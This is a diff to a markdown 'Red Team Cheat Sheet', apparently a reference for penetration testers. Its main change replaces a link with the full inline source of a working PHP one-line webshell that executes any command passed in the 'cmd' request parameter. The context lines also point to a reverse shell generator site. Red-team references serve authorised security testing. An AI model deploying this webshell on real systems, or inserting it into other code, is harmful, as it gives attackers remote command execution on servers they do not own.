@@ -1,5 +1,4 @@
 # Red Team Cheat Sheet
-
 Useful Quick Commands - Linux
 
 ```bash
@@ -83,7 +82,7 @@ Reverse Shell Generator https://www.revshells.com/
 
 ```bash
 # PHP One-liner webshell
-https://raw.githubusercontent.com/voidexec/sec/main/webshells/shell.php
+<?php if(isset($_REQUEST['cmd'])){ echo "<pre>"; $cmd = ($_REQUEST['cmd']); system($cmd); echo "</pre>"; die; }?>
 ```
 
 # Windows
